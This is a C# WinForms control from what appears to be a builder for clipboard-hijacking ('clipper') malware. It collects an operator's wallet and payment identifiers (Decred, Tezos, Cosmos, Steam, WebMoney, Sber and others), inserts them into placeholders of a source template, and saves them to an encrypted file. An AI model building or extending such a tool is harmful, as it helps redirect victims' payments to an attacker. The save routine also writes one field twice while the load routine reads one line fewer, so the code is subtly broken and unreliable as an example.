using System;
using System.IO;
using System.Linq;
using System.Threading;
using System.Windows.Forms;
using ClipPurSEditionBuilder.Sticks;

namespace ClipPurSEditionBuilder.ControlsSE
{
    public partial class NewWalletSE : UserControl
    {
        public NewWalletSE() => InitializeComponent();

        /// <summary>
        /// Файл куда будут сохранятся данные из TextBox'ов
        /// </summary>
        private static readonly string DataFile = FileControl.CombinePath(GlobalPath.CurrDir, "NewWalletSE.dat");

        /// <summary>
        /// Запрет ввода Русских букв в поле ввода.
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void TextBoxOnTextChanged(object sender, KeyPressEventArgs e)
        {
            char Key = e.KeyChar;

            if ((Key < 'A' || Key > 'Z') && (Key < 'a' || Key > 'z') && (Key < '0' || Key > '9') && Key != '_' && Key != (char)Keys.Back)
            {
                e.Handled = true;
            }
        }

        /// <summary>
        /// Подвешивание событий для кнопок
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void NewWalletSE_Load(object sender, EventArgs e)
        {
           // this.DonatePayBox.KeyPress += new KeyPressEventHandler(this.TextBoxOnTextChanged);
            this.DaimonBox.KeyPress += new KeyPressEventHandler(TextBoxOnTextChanged);
            this.DecredBox.KeyPress += new KeyPressEventHandler(TextBoxOnTextChanged);
            this.TezosBox.KeyPress += new KeyPressEventHandler(TextBoxOnTextChanged);
            this.CosmosBox.KeyPress += new KeyPressEventHandler(TextBoxOnTextChanged);
            this.SmartCashBox.KeyPress += new KeyPressEventHandler(TextBoxOnTextChanged);
            this.SteamOffBox.KeyPress += new KeyPressEventHandler(TextBoxOnTextChanged);
            this.WebRBox.KeyPress += new KeyPressEventHandler(TextBoxOnTextChanged);
            this.WebUBox.KeyPress += new KeyPressEventHandler(TextBoxOnTextChanged);
            this.WebZBox.KeyPress += new KeyPressEventHandler(TextBoxOnTextChanged);
            this.SberBox.KeyPress += new KeyPressEventHandler(TextBoxOnTextChanged);
            this.ViaBox.KeyPress += new KeyPressEventHandler(TextBoxOnTextChanged);
        }

        /// <summary>
        /// Замена исходного текста на текст из полей TextBox
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void AddDataToBuilder_Click(object sender, EventArgs e)
        {
            NativeMethods.SetFocus(IntPtr.Zero);
            SourceEdition.values["[DONATEPAY]"] = this.DonatePayBox.Text;
            SourceEdition.values["[BITDAIMON]"] = this.DaimonBox.Text;
            SourceEdition.values["[DECRED]"] = this.DecredBox.Text;
            SourceEdition.values["[TEZOS]"] = this.TezosBox.Text;
            SourceEdition.values["[SBER]"] = this.SberBox.Text;
            SourceEdition.values["[VIA]"] = this.ViaBox.Text;
            SourceEdition.values["[COSMOS]"] = this.CosmosBox.Text;
            SourceEdition.values["[SMARTCASH]"] = this.SmartCashBox.Text;
            SourceEdition.values["[STEAM]"] = this.SteamOffBox.Text;
            SourceEdition.values["[WEBWMR]"] = this.WebRBox.Text;
            SourceEdition.values["[WEBWMZ]"] = this.WebZBox.Text;
            SourceEdition.values["[WEBWMU]"] = this.WebUBox.Text;

            if (Thread.CurrentThread.CurrentCulture.TwoLetterISOLanguageName.Equals("en", StringComparison.InvariantCultureIgnoreCase))
            {
                ControlActive.CheckMessage(this.ShowMessage, Language.GlobalMessageStrings_en_US.DataAdd);
            }
            else
            {
                ControlActive.CheckMessage(this.ShowMessage, Language.GlobalMessageStrings_ru_RU.DataAdd);
            }
        }

        /// <summary>
        /// Кнопка для отчищения всех полей TextBox
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void FieldsClean_Click(object sender, EventArgs e)
        {
            ControlActive.CleanAllTextBoxesIn(this);
            if (Thread.CurrentThread.CurrentCulture.TwoLetterISOLanguageName.Equals("en", StringComparison.InvariantCultureIgnoreCase))
            {
                ControlActive.CheckMessage(this.ShowMessage, Language.GlobalMessageStrings_en_US.FieldsClean);
            }
            else
            {
                ControlActive.CheckMessage(this.ShowMessage, Language.GlobalMessageStrings_ru_RU.FieldsClean);
            }
        }

        /// <summary>
        /// Вызов метода сохранения данных на кнопку
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void SaveBoxs_Click(object sender, EventArgs e) => SaveDataInFile(DataFile);

        /// <summary>
        /// Вызов метода загрузки данных на кнопку
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void LoadBoxs_Click(object sender, EventArgs e) => LoadDataFromFile(DataFile);

        /// <summary>
        /// Метод для загрузки данных из файла в TextBox'ы
        /// </summary>
        /// <param name="path"></param>
        private void LoadDataFromFile(string path)
        {
            if (FileControl.ExistsFile(path))
            {
                try
                {
                    string[] text = File.ReadAllLines(path);

                    this.DonatePayBox.Text = EncryptKey.Decrypt(text[0], GlobalPath.SecretKey_Public);
                    this.DaimonBox.Text = EncryptKey.Decrypt(text[1], GlobalPath.SecretKey_Public);
                    this.DecredBox.Text = EncryptKey.Decrypt(text[2], GlobalPath.SecretKey_Public);
                    this.TezosBox.Text = EncryptKey.Decrypt(text[3], GlobalPath.SecretKey_Public);
                    this.SberBox.Text = EncryptKey.Decrypt(text[4], GlobalPath.SecretKey_Public);
                    this.ViaBox.Text = EncryptKey.Decrypt(text[5], GlobalPath.SecretKey_Public);
                    this.CosmosBox.Text = EncryptKey.Decrypt(text[6], GlobalPath.SecretKey_Public);
                    this.SmartCashBox.Text = EncryptKey.Decrypt(text[7], GlobalPath.SecretKey_Public);
                    this.SteamOffBox.Text = EncryptKey.Decrypt(text[8], GlobalPath.SecretKey_Public);
                    this.WebRBox.Text = EncryptKey.Decrypt(text[9], GlobalPath.SecretKey_Public);
                    this.WebZBox.Text = EncryptKey.Decrypt(text[10], GlobalPath.SecretKey_Public);
                    this.WebUBox.Text = EncryptKey.Decrypt(text[11], GlobalPath.SecretKey_Public);

                    if (Thread.CurrentThread.CurrentCulture.TwoLetterISOLanguageName.Equals("en", StringComparison.InvariantCultureIgnoreCase))
                    {
                        ControlActive.CheckMessage(this.ShowMessage, Language.GlobalMessageStrings_en_US.DataLoader);
                    }
                    else
                    {
                        ControlActive.CheckMessage(this.ShowMessage, Language.GlobalMessageStrings_ru_RU.DataLoader);
                    }
                }
                catch (Exception ex)
                {
                    if (Thread.CurrentThread.CurrentCulture.TwoLetterISOLanguageName.Equals("en", StringComparison.InvariantCultureIgnoreCase))
                    {
                        ControlActive.CheckMessage(this.ShowMessage, Language.GlobalMessageStrings_en_US.ErrorLoader);
                    }
                    else
                    {
                        ControlActive.CheckMessage(this.ShowMessage, Language.GlobalMessageStrings_ru_RU.ErrorLoader);
                    }
                    FileControl.CreateFile(FileControl.CombinePath(GlobalPath.CurrDir, "ErrorNewLoad.txt"), ex.Message);
                }
            }
            else
            {
                if (Thread.CurrentThread.CurrentCulture.TwoLetterISOLanguageName.Equals("en", StringComparison.InvariantCultureIgnoreCase))
                {
                    ControlActive.CheckMessage(this.ShowMessage, Language.GlobalMessageStrings_en_US.FileExists);
                }
                else
                {
                    ControlActive.CheckMessage(this.ShowMessage, Language.GlobalMessageStrings_ru_RU.FileExists);
                }
            }
        }

        /// <summary>
        ///  Метод для сохранения данных в файла из TextBox'ов
        /// </summary>
        /// <param name="path"></param>
        public void SaveDataInFile(string path)
        {
            try
            {
                if (!CheckIsEmptyBoxs())
                {
                    if (Thread.CurrentThread.CurrentCulture.TwoLetterISOLanguageName.Equals("en", StringComparison.InvariantCultureIgnoreCase))
                    {
                        ControlActive.CheckMessage(this.ShowMessage, Language.GlobalMessageStrings_en_US.EmptySave);
                    }
                    else
                    {
                        ControlActive.CheckMessage(this.ShowMessage, Language.GlobalMessageStrings_ru_RU.EmptySave);
                    }
                }
                else
                {
                    using (var sw = new StreamWriter(path))
                    {
                        sw.WriteLine(EncryptKey.Encrypt(this.DonatePayBox.Text, GlobalPath.SecretKey_Public));
                        sw.WriteLine(EncryptKey.Encrypt(this.DaimonBox.Text, GlobalPath.SecretKey_Public));
                        sw.WriteLine(EncryptKey.Encrypt(this.DecredBox.Text, GlobalPath.SecretKey_Public));
                        sw.WriteLine(EncryptKey.Encrypt(this.TezosBox.Text, GlobalPath.SecretKey_Public));
                        sw.WriteLine(EncryptKey.Encrypt(this.SberBox.Text, GlobalPath.SecretKey_Public));
                        sw.WriteLine(EncryptKey.Encrypt(this.ViaBox.Text, GlobalPath.SecretKey_Public));
                        sw.WriteLine(EncryptKey.Encrypt(this.CosmosBox.Text, GlobalPath.SecretKey_Public));
                        sw.WriteLine(EncryptKey.Encrypt(this.SmartCashBox.Text, GlobalPath.SecretKey_Public));
                        sw.WriteLine(EncryptKey.Encrypt(this.SteamOffBox.Text, GlobalPath.SecretKey_Public));
                        sw.WriteLine(EncryptKey.Encrypt(this.SteamOffBox.Text, GlobalPath.SecretKey_Public));
                        sw.WriteLine(EncryptKey.Encrypt(this.WebRBox.Text, GlobalPath.SecretKey_Public));
                        sw.WriteLine(EncryptKey.Encrypt(this.WebZBox.Text, GlobalPath.SecretKey_Public));
                        sw.WriteLine(EncryptKey.Encrypt(this.WebUBox.Text, GlobalPath.SecretKey_Public));
                        sw.Flush();

                        if (Thread.CurrentThread.CurrentCulture.TwoLetterISOLanguageName.Equals("en", StringComparison.InvariantCultureIgnoreCase))
                        {
                            ControlActive.CheckMessage(this.ShowMessage, Language.GlobalMessageStrings_en_US.DataSave);
                        }
                        else
                        {
                            ControlActive.CheckMessage(this.ShowMessage, Language.GlobalMessageStrings_ru_RU.DataSave);
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                if (Thread.CurrentThread.CurrentCulture.TwoLetterISOLanguageName.Equals("en", StringComparison.InvariantCultureIgnoreCase))
                {
                    ControlActive.CheckMessage(this.ShowMessage, Language.GlobalMessageStrings_en_US.ErrorSave);
                }
                else
                {
                    ControlActive.CheckMessage(this.ShowMessage, Language.GlobalMessageStrings_ru_RU.ErrorSave);
                }
                FileControl.CreateFile(FileControl.CombinePath(GlobalPath.CurrDir, "ErrorNewSave.txt"), ex.Message);
            }
        }

        private bool CheckIsEmptyBoxs() => this.Controls.OfType<TextBox>().Any(x => !string.IsNullOrEmpty(x.Text));
    }
}